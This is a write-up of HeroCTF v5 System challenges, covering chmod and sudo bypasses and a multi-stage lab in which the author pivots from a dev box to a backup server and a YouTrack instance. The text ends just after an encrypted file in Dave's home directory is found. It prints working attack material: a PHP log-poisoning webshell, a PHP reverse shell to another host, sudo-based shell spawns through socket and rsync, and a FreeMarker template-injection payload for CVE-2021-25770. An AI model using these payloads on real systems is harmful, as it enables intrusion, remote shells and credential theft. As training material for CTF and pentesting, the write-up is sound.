---
title: HeroCTFv5 - System Collection
author: V0lk3n
tags: CTF, HeroCTF, System, Enumeration, lateralmovement, CyberSecurity, pentest, exploit, youtrack, jetbrains, privesc
---

# HeroCTF v5 - System Collection

![logo](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/e39446f8-11dd-49c4-9b8d-eb3774df2a53)
![Scoreboard](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/11f0a23b-9729-4af4-9392-d727a2b794d3)

> Written by [V0lk3n](https://twitter.com/V0lk3n)

## Author Note

```
Thanks a lot to the HeroCTF team! This was a really nice event! The System category was really cool, i got a lot of fun!

Enjoy while reading my Write-Up!

- V0lk3n
```

## Table of Contents

* 1.0 [Chm0d](#chmod)
* 2.0 [SUDOkLu](#sudoklu)
* 3.0 [LFM-0 : Your mission, should you choose to accept it](#lfm0)
* 4.0 [LFM-1 : Bug hunting](#lfm1)
* 5.0 [LFM-2 : A woman's weapon](#lfm2)
* 6.0 [LFM-3 : admin:admin](#lfm3)
* 7.0 [LFM-4 : Put the past behind](#lfm4)
* 8.0 [LFM-Unintended Way : Get a shell as Dave](#unintended)
* 9.0 [Credits](#Credits)

## Chm0d<a name="chmod"></a>

Difficulty : **Easy**

Value : **50 pts**

Author : **Alol**

Description :

```
Catch-22: a problematic situation for which the only solution is denied by a circumstance inherent in the problem.  
  
Credentials: `user:password123`
```

### Solution 

After deploying `Chm0d` instance and connecting to it through ssh with the given credentials, we find the flag and notice that it had no permissions.

```bash
user@ca5f7dee1a6bc7eaebc04d9fca2671fc:~$ ls -la /
total 84
drwxr-xr-x   1 root root 4096 May 15 16:57 .
drwxr-xr-x   1 root root 4096 May 15 16:57 ..
-rwxr-xr-x   1 root root    0 May 15 16:57 .dockerenv
drwxr-xr-x   1 root root 4096 May 12 11:44 bin
drwxr-xr-x   2 root root 4096 Apr  2 11:55 boot
drwxr-xr-x   5 root root  340 May 15 16:57 dev
drwxr-xr-x   1 root root 4096 May 15 16:57 etc
----------   1 user user   40 May 12 11:44 flag.txt
...
```

Next step would be to give it read access permission with `chmod`, but here is the problem. It as no permissions too...

```bash
user@ca5f7dee1a6bc7eaebc04d9fca2671fc:~$ ls -la /bin/chmod                                                                                                                                                                                 
---------- 1 root root 64448 Sep 24  2020 /bin/chmod 
```

We need to find an alternative way. After few google search about `chmod` binary alternative. We found that we can use `Perl` with the `chmod` library.

Source :  https://perldoc.perl.org/functions/chmod

Come back to our challenge, and let's see if we can use `Perl`.

```bash
user@ca5f7dee1a6bc7eaebc04d9fca2671fc:~$ perl -e "print 'w00t'"
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
        LANGUAGE = (unset),
        LC_ALL = (unset),
        LANG = "fr_CH.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
w00t                                                                                                                                                                                                 
```

There is some local setting warning, but thats not a problem, we can use it.

Now give the read access permission to the `flag.txt` file and read its content.

```bash
user@ca5f7dee1a6bc7eaebc04d9fca2671fc:~$ ls -la /flag.txt
---------- 1 user user 40 May 12 11:44 /flag.txt

user@ca5f7dee1a6bc7eaebc04d9fca2671fc:~$ perl -e 'chmod 444, "/flag.txt"'
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
        LANGUAGE = (unset),
        LC_ALL = (unset),
        LANG = "fr_CH.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").

user@ca5f7dee1a6bc7eaebc04d9fca2671fc:~$ ls -la /flag.txt
-rw-rwxr-- 1 user user 40 May 12 11:44 /flag.txt

user@ca5f7dee1a6bc7eaebc04d9fca2671fc:~$ cat /flag.txt
Hero{chmod_1337_would_have_been_easier}
```

Flag : **Hero{chmod_1337_would_have_been_easier}**


## SUDOkLu<a name="sudoklu"></a>

Difficulty : **Easy**

Value : **50 pts**

Author : **Log_s**

Description :

```
This is a warmup to get you going. Your task is to read `/home/privilegeduser/flag.txt`. For our new commers, the title might steer you in the right direction ;). Good luck!  
  
Credentials: `user:password123`
```

### Solution

As said the description, the title hint the right direction : ```sudo -l```

Once the challenge deployed, and accessed through ssh with the given credentials (`user:password123`), we run the ```sudo -l``` command.

```bash
user@sudoklu:~$ sudo -l
Matching Defaults entries for user on sudoklu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User user may run the following commands on sudoklu:
    (privilegeduser) NOPASSWD: /usr/bin/socket

```

We notice that we can use the ```socket``` binary with ```sudo``` as ```privilegeduser```.

A quick look at ```GTFObins```, and we found how to abuse the `socket` binary to performe privilege escalation.

Source : https://gtfobins.github.io/#socket

![1-GTFObin](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/35fb0f5e-c499-4ac4-99ac-fb7afcc75667)

Let's exploit it. First open another ssh access to the target, and run a netcat listener on it. Then on the other ssh instance, run the `socket` command as `privilegeduser`.

![2-access](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/6b1aa1ad-b132-4f44-909a-4f8d446ef806)

Nice, we get a shell back as `privilegeduser` user. Finally read the flag.

```bash
$ whoami
privilegeduser
$ cd /home/privilegeduser
$ ls
flag.txt
$ cat flag.txt
Hero{ch3ck_f0r_m1sc0nf1gur4t1on5}
```

Flag : **Hero{ch3ck_f0r_m1sc0nf1gur4t1on5}**

## LFM-0 : Your mission, should you choose to accept it<a name="lfm0"></a>

Difficulty : **Easy**

Value : **50 pts**

Author : **Log_s**

Description :

```
The Infamous Mother Fluckers have been hired to take down a guy named Dave. I think his sister's husband's cousin's wife's brother's son had an affaire with our client's wife, and for some reason he want's to take it out on him. But who are we to judge right ? We're getting paid, that's enough for me.  
  
I got you a job in the same development start-up as Dave. In fact, you are his team mate. I asked around in some underground circles, and word is on the streets that our guy is selling customer information. If you can get proof of that and send it to his boss, he'll get fired and we'll get paid. I'm counting on you.  
  
And keep you eyes opened, you might find some other interseting stuff on the company's network.  
  
For this mission, you are bob. Your ssh credentials are `bob:password`.  
  
Enter this flag to accept the mission : `Hero{I_4cc3pt_th3_m1ss10n}`  
  
_This message will self-destruct in 5 seconds._
```

### Solution

This challenge only give us the SSH credentials of LFM instance and give the flag in the description to begun the LFM challenges collection.

Flag : **Hero{I_4cc3pt_th3_m1ss10n}**

## LFM-1 : Bug Hunting<a name="lfm1"></a>

Difficulty : **Easy**

Value : **68 pts**

Author : **Log_s**

Description :

```
Tracking bugs can be tidious, if you're not equiped with the right tools of course...
```

### Solution

Once the instance deployed, and connected to SSH with the credentials given in the previous challenge description (`bob:password`), we can start our enumeration.

> Note : This instance start two machines, the SSH credentials work only on one of them. So we already know that we should probably pivot to the other box at a moment.

We notice a `welcome.txt` note into bob home directory, read it give us few interesting data.

```
bob@dev:~$ ls
welcome.txt

bob@dev:~$ cat welcome.txt
Hi Bob!

Welcome to our firm. I'm Dave, the tech lead here. We are going to be working together on our app.

Unfortunately, I will be on leave when you arrive. So take the first few days to get familiar with our infrastructure, and tools.

We are using YouTrack as our main issue tracker. The app runs on this machine (port 8080). We are both going to use the "dev" account at first, but I will create a separate account for you later. There is also an admin account, but that's for our boss. The credentials are: "dev:aff6d5527753386eaf09".

The development server with the codebase is offline for a few days due to a hardware failure on our hosting provider's side, but don't worry about that for now.

We also have a backup server, that is supposed to backup the main app's code (but it doesn't at the time) and also the YouTrack configuration and data.

Only I have an account to access it, but you won't need it. If you really have to see if everything is running fine, I made a little utility that run's on a web server.

The command to check the logs is:
curl backup

The first backups might be messed up a bit, a lot bigger than the rest, they occured while I was setting up YouTrack with it's administration account.

Hope you find everything to you liking, and welcome again!

Dave
```

Reading it, we know that :

* YouTrack is used as main issue tracker, and run on this machine at port 8080
* Dave and us will use the `dev` account with the credentials `dev:aff6d5527753386eaf09`
* There is an `admin` account.
* The development server with the codebase is offline.
* There is a `backup server` which is supposed to backup the main app's code and YouTrack configuration and data, but it doesn't at the time.
* Only Dave, have an account to access the `backup server`, but he made an utility to look the `backup server` log using the command `curl backup`.
* The first backups might be messed up with different size than the others. This occured while Dave was setting up YouTrack administration account. So maybe Dave make misstake with this :)

As there is other box, let's read the `/etc/hosts` file first.

```bash
bob@dev:~$ cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.99.227.3     dev
bob@dev:~$ hostname
dev
```

There is only the machine where we are connected to. So now, inspect the `curl backup` command.

```bash
bob@dev:~$ curl backup
05/11/23|20:24:02 [+] Data copied from dev machine
05/11/23|20:24:02 [+] Data from dev zipped (size:4998014)
05/11/23|20:25:01 [!] Failed to fetch data from dev machine
05/15/23|20:15:01 [+] Data copied from dev machine
05/15/23|20:15:01 [+] Data from dev zipped (size:865575)
05/15/23|20:16:01 [+] Data copied from dev machine
05/15/23|20:16:02 [+] Data from dev zipped (size:884385)
05/15/23|20:17:01 [+] Data copied from dev machine
05/15/23|20:17:01 [+] Data from dev zipped (size:884385)
05/15/23|20:18:01 [+] Data copied from dev machine
05/15/23|20:18:01 [+] Data from dev zipped (size:884385)
```

Nothing interesting, but now let's run again the command with the verbose parameter.

```bash
bob@dev:~$ curl -v backup
*   Trying 10.99.227.2:80...
* Connected to backup (10.99.227.2) port 80 (#0)
> GET / HTTP/1.1
> Host: backup
> User-Agent: curl/7.81.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Mon, 15 May 2023 20:19:29 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< 
05/11/23|20:24:02 [+] Data copied from dev machine
05/11/23|20:24:02 [+] Data from dev zipped (size:4998014)
05/11/23|20:25:01 [!] Failed to fetch data from dev machine
05/15/23|20:15:01 [+] Data copied from dev machine
05/15/23|20:15:01 [+] Data from dev zipped (size:865575)
05/15/23|20:16:01 [+] Data copied from dev machine
05/15/23|20:16:02 [+] Data from dev zipped (size:884385)
05/15/23|20:17:01 [+] Data copied from dev machine
05/15/23|20:17:01 [+] Data from dev zipped (size:884385)
05/15/23|20:18:01 [+] Data copied from dev machine
05/15/23|20:18:01 [+] Data from dev zipped (size:884385)
05/15/23|20:19:02 [+] Data copied from dev machine
05/15/23|20:19:02 [+] Data from dev zipped (size:884385)
* Connection #0 to host backup left intact
```

Nice, now we got our targets.

```
Dev machine : 10.99.227.3

Backup machine : 10.99.227.2
```

> Note : While writing this writeup, i was needed to start a lot of instance. And because of this the ip address may change. Just keep in mind that the dev machine is x.x.x.3 and backup machine is x.x.x.2.

Now, there should be a YouTrack instance running on the localhost at port 8080, let's use curl to be sure that something is running.

```bash
bob@dev:~$ curl http://127.0.0.1:8080/
<!doctype html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="format-detection" content="telephone=no"/>
    <title>JetBrains YouTrack 2020.5 is warming up...</title>
    <meta name="description" content="">
...
```

As expected, we can see the YouTrack instance, now let's portforward the port 8080 using SSH, this will allow us to access it from our localhost.

> Note : You should keep the SSH window open, to keep the portforwarding working.

```bash
$ ssh -L 8080:localhost:8080 bob@dyn-02.heroctf.fr -p 13399                                                      
bob@dyn-02.heroctf.fr's password: 
bob@dev:~$ 
```

Now open you'r browser, and access the port 8080 on your localhost.

```
http://127.0.0.1:8080/
```

We are redirected to a YouTrack Dashboard where we are very limited if we doesnt log in. So let's log in as Dev with the credentials given into `welcome.txt` note (`dev:aff6d5527753386eaf09`).

![1-LoginYouTrackDev](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/3d896c70-16bb-45b2-8d20-e9611f8e8692)

Once logged in. Let's first look at the issues list.

![2-YouTrack_Issue](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/669529a4-3171-47ef-82ab-87bc20d82493)

We will examine all of them in the next challenge. First let's open the issue `ST-5 Is that...`

![3-Flag](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/32696e79-284c-4d4c-96a2-2d55f05c4fd8)

Is that a flag? YES! It is! 

> Note : Fun fact, the flag issue type is "cosmetics".

Flag : **Hero{1_tr4ck_y0u_tr4ck_h3_tr4ck5}**

## LFM-2 : A woman's weapon<a name="lfm2"></a>

Difficulty : **Medium**

Value : **405 pts**

Author : **Log_s**

Description :

```
Historically considered as a woman's weapon, pretty sure that's not true and anyone can exploit it.  
  
**PS**: _When you understand what to exploit, try it locally first, as a failed attempt would very likely make any further attempts impossible._
```

### Solution

Let's come back to our YouTrack issues.

The first one is a glitches, where the username is out of the screen when opening the burger menu on smartphone. Not useful.

The second said that there is an RCE in the app, and it give the URL location of the RCE. But if you highligh the link, you notice that it redirect to YouTube! Have a nice Rick Roll!

![4-RickRoll](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/0d0c0595-577b-46c2-bf37-44d9ec7bbb07)


The third is a lot interesting. The admin is asking for an utility to access backup logs, he said that he found a snippet of code and edited the log file path in it so the file should be ready to push. 

![5-Backup_tool](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/16c77c52-27ae-4880-a84b-cd2f940f27a1)

We can see the code called ```log_checker.php``` as attachment and the `dev` acount answer that he push the code. 

Download the code for later, and let's examine the last issue.

![6-wedontcaredude](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/adad51d4-46cd-421a-b6b9-ac409f1512cc)

Not useful, let's come back to our previous downloaded code called ```log_checker.php```.

```php
<?php
    $file = $_GET['file'];
    if(isset($file))
    {
        include("$file");
    }
    else
    {
        include("/var/log/backup.log");
    }
?>
```

So this code will look if you provided a file, and if you provided one, it will return its content, else it will return the content of ```/var/log/backup.log```.

Great, so we got a LFI vulnerability here, and apparently it's the code used when we use the command ```curl backup```.

Let's come back to the SSH instance, and let's try to read the ```/etc/hosts``` file.

```bash
bob@dev:~$ curl "http://backup/?file=/etc/hosts"
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.99.6.2       backup
```

Perfect! We can successfully exploit the LFI on the backup machine.

Now we need to enumerates the machine from the LFI vulnerability. First we try direclty to look if there is a SSH key located in the `/home/backup/.ssh/` directory.

```bash
bob@dev:~$ curl http://backup/?file=/home/backup/.ssh/id_rsa.pub
bob@dev:~$ curl http://backup/?file=/home/backup/.ssh/id_rsa
bob@dev:~$ curl http://backup/?file=/home/backup/.ssh/known_hosts
bob@dev:~$
```

Seem not. We know that initially, the utility will read the backup log. So let's look if we can read SSH logs.

```bash
bob@dev:~$ curl "http://backup/?file=/var/log/auth.log"
May 15 20:24:39 backup sudo: pam_unix(sudo:session): session closed for user root
May 15 20:24:39 backup sshd[54]: Server listening on 0.0.0.0 port 22.
May 15 20:24:39 backup sshd[54]: Server listening on :: port 22.
May 15 20:25:01 backup CRON[55]: pam_env(cron:session): Unable to open env file: /etc/default/locale: No such file or directory
May 15 20:25:01 backup CRON[55]: pam_unix(cron:session): session opened for user dave(uid=1000) by (uid=0)
May 15 20:25:02 backup CRON[55]: pam_unix(cron:session): session closed for user dave
May 15 20:26:01 backup CRON[69]: pam_env(cron:session): Unable to open env file: /etc/default/locale: No such file or directory
May 15 20:26:01 backup CRON[69]: pam_unix(cron:session): session opened for user dave(uid=1000) by (uid=0)
May 15 20:26:01 backup CRON[69]: pam_unix(cron:session): session closed for user dave
May 15 20:27:01 backup CRON[83]: pam_env(cron:session): Unable to open env file: /etc/default/locale: No such file or directory
...
```

Great! We can read the SSH logs of the backup machine! Let's look if the log will show our SSH connection attempt to the backup machine.  

> Note : From you'r Kali, try a SSH connection on the second machine, you should look at the port on the deployed instance. Or from bob on the dev machine, you can SSH directly on backup port 22.


```bash
bob@dev:~$ curl http://backup/?file=/var/log/auth.log
...
May 15 21:21:42 backup sshd[86]: Invalid user v0lk3n_w4s_h3r3 from 172.133.71.337 port 55990
May 15 21:21:42 backup sshd[86]: Excess permission or bad ownership on file /var/log/btmp
May 15 21:21:44 backup sshd[86]: pam_unix(sshd:auth): check pass; user unknown
May 15 21:21:44 backup sshd[86]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=172.133.71.337 
May 15 21:21:46 backup sshd[86]: Failed password for invalid user v0lk3n_w4s_h3r3 from 172.133.71.337 port 55990 ssh2
...
```

Nice! Now the idea, is exploiting `Log Poisoning`. To do this, we need to login through SSH, with a payload as user, that will allow us to leverage the LFI to an RCE.

> Note : The challenge name "A woman's weapon" hint the "Poison" for "Log Poisoning". But honnestly, i've found the vulnerability long before understand this.

Let's connect again through SSH, with a PHP code as username, which will allow us to pratice command execution.

```bash
$ ssh '<?php system($_GET["cmd"]);?>'@dyn-01.heroctf.fr -p 13748
<?php system($_GET["cmd"]);?>@dyn-01.heroctf.fr's password: 
Permission denied, please try again.
```

Now let's comme back on the dev machine, and trigger the RCE from the LFI to execute the ```ls -l /``` command.

> Note : A bigger output, a bigger visibility. The output of `ls` in this case only return one or two files. So its kind of hard without using `grep` to find it in the result.

Don't forget to URL encode you'r command.

```bash
curl "http://backup/?file=/var/log/auth.log&cmd=ls%20-l%20%2F"
...
May 15 22:03:01 backup CRON[72]: pam_unix(cron:session): session opened for user dave(uid=1000) by (uid=0)
May 15 22:03:02 backup CRON[72]: pam_unix(cron:session): session closed for user dave
May 15 22:03:36 backup sshd[56]: pam_unix(sshd:auth): check pass; user unknown
May 15 22:03:38 backup sshd[56]: Failed password for invalid user total 60
drwxrwx---   1 backup backup 4096 May 15 22:04 backup
lrwxrwxrwx   1 root   root      7 Apr 25 14:03 bin -> usr/bin
drwxr-xr-x   2 root   root   4096 Apr 18  2022 boot
drwxr-xr-x   5 root   root    360 May 15 22:01 dev
drwxr-xr-x   1 root   root   4096 May 15 22:01 etc
drwxr-xr-x   1 root   root   4096 May 12 18:15 home
lrwxrwxrwx   1 root   root      7 Apr 25 14:03 lib -> usr/lib
lrwxrwxrwx   1 root   root      9 Apr 25 14:03 lib32 -> usr/lib32
lrwxrwxrwx   1 root   root      9 Apr 25 14:03 lib64 -> usr/lib64
lrwxrwxrwx   1 root   root     10 Apr 25 14:03 libx32 -> usr/libx32
drwxr-xr-x   2 root   root   4096 Apr 25 14:03 media
drwxr-xr-x   2 root   root   4096 Apr 25 14:03 mnt
drwxr-xr-x   2 root   root   4096 Apr 25 14:03 opt
dr-xr-xr-x 224 root   root      0 May 15 22:01 proc
drwx------   1 root   root   4096 May 12 18:15 root
drwxr-xr-x   1 root   root   4096 May 15 22:01 run
lrwxrwxrwx   1 root   root      8 Apr 25 14:03 sbin -> usr/sbin
drwxr-xr-x   2 root   root   4096 Apr 25 14:03 srv
dr-xr-xr-x  13 root   root      0 May 12 19:18 sys
drwxrwxrwt   1 root   root   4096 May 15 22:04 tmp
drwxr-xr-x   1 root   root   4096 Apr 25 14:03 usr
drwxr-xr-x   1 root   root   4096 May 12 18:15 var
 from 172.133.71.337 port 49260 ssh2
May 15 22:03:38 backup sshd[56]: Excess permission or bad ownership on file /var/log/btmp
May 15 22:03:39 backup sshd[56]: pam_unix(sshd:auth): check pass; user unknown
May 15 22:03:40 backup sshd[56]: Failed password for invalid user total 60
...
```

Perfect! Now let's get a shell on the backup machine. Open another SSH instance to backup machine, and open a netcat listener.

```bash
bob@dev:~$ nc -nvlp 1234
Listening on 0.0.0.0 1234
```

Now come back to you'r other SSH instance, and look at the `dev` machine IP address through the `hosts` file.

```bash
bob@dev:~$ cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.99.236.3     dev
```

As we know, PHP is running on the machine because of the `log_checker.php` utility used to perform the LFI/RCE. With thoses informations, go to Pentest Monkey website, and take the PHP reverse shell.

Source : https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Replace the ip address.

```php
php -r '$sock=fsockopen("10.99.236.3",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Then URL encode it.

Source : https://meyerweb.com/eric/tools/dencoder/

```bash
php%20-r%20%27%24sock%3Dfsockopen(%2210.99.236.3%22%2C1234)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27
```

Go back to to both SSH instance, be sure that you'r netcat instance is running on the same port as you'r payload, and execute the RCE from the LFI to get a shell.

```bash
bob@dev:~$ curl "http://backup/?file=/var/log/auth.log&cmd=php%20-r%20%27%24sock%3Dfsockopen(%2210.99.236.3%22%2C1234)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27"
```

And we got a shell as `www-data` on backup machine!

![7-Shell_Backup](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/39e30cdf-ba11-479a-9aff-2c51a96eb42c)

Import the TTY, and look if we can do something with sudo.

```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'                                                                    
www-data@backup:~/html$ sudo -l                                                                                     
sudo -l                                                                                                             
Matching Defaults entries for www-data on backup:                                                                   
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on backup:
    (backup) NOPASSWD: /usr/bin/rsync
```

We can use ```rsync``` with ```sudo``` as ```backup``` user. Let's go to GTFObins and look if we can do something with it.

Source : https://gtfobins.github.io/#rsync

![8-Privesc](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/1fa8be73-f001-411a-a543-317b3e989049)

Great! We can escalate our privilege to user backup! Let's do it.

```bash
sudo -u backup /usr/bin/rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
```

![9-backup_shell](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/2e34048b-0ed6-46b0-8f87-54178cd922a6)

Once again, import the TTY and start to enumerate the new machine.

```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
backup@backup:/var/www/html$
```

After looking around, we notice a backup directory at the root of the machine.

![10-flag](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/20ecd8eb-85ee-4e40-9210-8b6f96e0ed8a)

And we got the flag!

Flag : **Hero{n0t_0nly_hum4ns_c4n_b3_po1s3n3d}**

## LFM-3 : admin:admin<a name="lfm3"></a>

Difficulty : **Medium**

Value : **451 pts**

Author : **Log_s**

Description :

```
I already looked there didn't I ?
```

### Solution

As we can understand, from the description, we need to come back to YouTrack. And as we understand, with the title we need to login as admin.

> Note : Of course, at the first time of login as "dev" on YouTrack, you should already have tried to login as admin with those generic passwords. In fact, you already know that the username is admin, but the password isn't. 

So let's look in our backup. As we remember the `welcome.txt` note, Dave has done some settings change on YouTrack, and the backup files shouldn't be all the same.

```bash
backup@backup:/backup$ ls -la
ls -la                                                                                                              
total 20460
drwxrwx--- 1 backup backup   4096 May 15 22:54 .
drwxr-xr-x 1 root   root     4096 May 15 22:31 ..
-rwxr-xr-x 1 backup backup    760 May 12 10:17 backup.sh
-rwx------ 1 backup backup     38 May 12 18:15 flag.txt
-rw-r--r-- 1 dave   dave   691271 May 12 10:17 youtrack-1683836642.zip
-rw-rw-r-- 1 dave   dave   865593 May 15 22:32 youtrack-1684189921.zip
-rw-rw-r-- 1 dave   dave   879795 May 15 22:33 youtrack-1684189981.zip
-rw-rw-r-- 1 dave   dave   879795 May 15 22:34 youtrack-1684190041.zip
-rw-rw-r-- 1 dave   dave   879795 May 15 22:35 youtrack-1684190102.zip
-rw-rw-r-- 1 dave   dave   879795 May 15 22:36 youtrack-1684190161.zip
-rw-rw-r-- 1 dave   dave   879795 May 15 22:37 youtrack-1684190222.zip
-rw-rw-r-- 1 dave   dave   879795 May 15 22:38 youtrack-1684190281.zip
-rw-rw-r-- 1 dave   dave   879795 May 15 22:39 youtrack-1684190342.zip
-rw-rw-r-- 1 dave   dave   879795 May 15 22:40 youtrack-1684190401.zip
-rw-rw-r-- 1 dave   dave   879795 May 15 22:41 youtrack-1684190462.zip
-rw-rw-r-- 1 dave   dave   879795 May 15 22:42 youtrack-1684190521.zip
-rw-rw-r-- 1 dave   dave   879795 May 15 22:43 youtrack-1684190581.zip
-rw-rw-r-- 1 dave   dave   879795 May 15 22:44 youtrack-1684190641.zip
-rw-rw-r-- 1 dave   dave   879795 May 15 22:45 youtrack-1684190701.zip
-rw-rw-r-- 1 dave   dave   879795 May 15 22:46 youtrack-1684190762.zip
-rw-rw-r-- 1 dave   dave   879795 May 15 22:47 youtrack-1684190821.zip
-rw-rw-r-- 1 dave   dave   879795 May 15 22:48 youtrack-1684190882.zip
-rw-rw-r-- 1 dave   dave   879795 May 15 22:49 youtrack-1684190941.zip
-rw-rw-r-- 1 dave   dave   879795 May 15 22:50 youtrack-1684191002.zip
-rw-rw-r-- 1 dave   dave   879795 May 15 22:51 youtrack-1684191061.zip
-rw-rw-r-- 1 dave   dave   879795 May 15 22:52 youtrack-1684191121.zip
-rw-rw-r-- 1 dave   dave   879795 May 15 22:53 youtrack-1684191182.zip
-rw-rw-r-- 1 dave   dave   879795 May 15 22:54 youtrack-1684191241.zip
```

By looking at the size and date, we notice that a lot of backups should be the same. Excepted the two first.

The first backup had a lower size and was created the 12 May. The second backup had a bigger size than the first, but a lower size than each others, but it was created at the same time. Then each backup was created at the same time with one second of interval and get the same size.

So let's dig on the two first backup.

The idea is, we will unzip the first, looking on each files for keywords such as "key" or "pass". If nothing, we look at the second. If nothing we look at the last one, and if there is nothing we will restart and look deeper.

```bash
unzip youtrack-1683836642.zip
```

Now look for "key" and "pass" keyword on the extrated content.

```
backup@backup:/backup$ grep -nRHI "pass" *
...
youtrack/conf/youtrack/service-config.properties:45:jetbrains.jetpass.frontend=../admin/hub
youtrack/conf/youtrack/service-config.properties:67:jetbrains.jetpass.groups.list=true
youtrack/conf/youtrack/service-config.properties:78:bundle.additional-keystore-password=LHnVTSABKX
youtrack/conf/youtrack/service-config.properties:115:jetbrains.jetpass.add.license.hide=true
youtrack/conf/youtrack/service-config.properties:121:bundle.root-password=Th1sIsAV3ryS3cur3Adm1nP4ssw0rd0101#
...
```

Perfect! We found two passwords, `LHnVTSABKX` which is a keystore password, and `Th1sIsAV3ryS3cur3Adm1nP4ssw0rd0101#` which is our admin YouTrack password!

Come back in our port forwarded instance of YouTrack, and login as `admin:Th1sIsAV3ryS3cur3Adm1nP4ssw0rd0101#`.

Now we got full takeover on YouTrack. We start to look which new features we can use.

We notice a Notification Template, which seem interesting, but at first look there is nothing.

![11-Notification_Menu](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/8370b127-691c-4294-be03-0fc0d612136c)

![12-Notification_Templates](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/c5faac07-44a9-4157-810e-708002667e40)

Let's Google if our Jetbrains YouTrack instance is vulnerable to something. You can find the version at the bottom of the page in the dashboard home page.

![13-YouTrack_Version](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/d7ecf937-1f76-4cd4-8c06-25eccdc3c772)

After a quick google search `YouTrack 2020.5.2579 Exploit`, we find this blog post about how to exploit `CVE-2021-25770` which is a Server Side Template Injection vulnerability on YouTrack.

Source : https://www.synacktiv.com/publications/exploiting-cve-2021-25770-a-server-side-template-injection-in-youtrack.html

> Note : Follow the blog post, it is really well detailled.And follow the given links to learn more about the sandbox bypass used.

First, we will test if the SSTI vulnerability is not patched. For it, we load one of the existing notification template.

![14-Load_Notification](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/dea41fc1-a975-4c80-8f59-62a763cbafd5)

Remove the existing content and try to do the classic calcul `7*7` and let's see if the console return us the result.

![15-SSTI](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/838f41e1-e2ba-4460-b7c7-dbc33be17a46)

Perfect! Let's execute some commands

```bash
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

![16-Exploit_SSTI](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/6d804f4e-9ad9-4328-a873-1a3cf9cbe49b)

Great, our command execution seem working. But we seem a bit limited, we are not able to get a reverse shell. As exemple, echoing a strings to file doesn't work, it will output the result like you echoing the whole command. Reverse shell such as PHP, nc, python, bash doesn't work. Trying to read ssh keys of dave doesnt work. And a lot of other things.

So now repeat the process to enumerate the machine. We start to list the files in the Dave home directory.

```bash
${dwf.newInstance(ec,null)("ls /home/dave/")}
```

![17-LocateFlag](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/3d9a0264-c81a-498d-8307-b45b99519dd9)

We find the flag! Let's read it's content.

![18-flag](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/52d4b617-85fa-4f4a-a686-1c19ce0c176e)

Flag : **Hero{pl41nt3xt_p4ssw0rd_4nd_s5t1_b1t_much_41nt_1t?}**


## LFM-4 : Put the past behind<a name="lfm4"></a>

Difficulty : **Easy**

Value : **454 pts**

Author : **Log_s**

Description :

```
One more step to go!
```

### Solution

Once the content of Dave user home directory listed, we found the previous flag, but we also seen a file called `randomfile.txt.enc`.

![21-encoded_file](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/47a5fa74-540c-430c-8b73-a2994d975ca5)

As we remember our initial goal, Dave is selling customers informations and we need to get proof of that. As this is the final challenge, this encrypted file should be our proof.

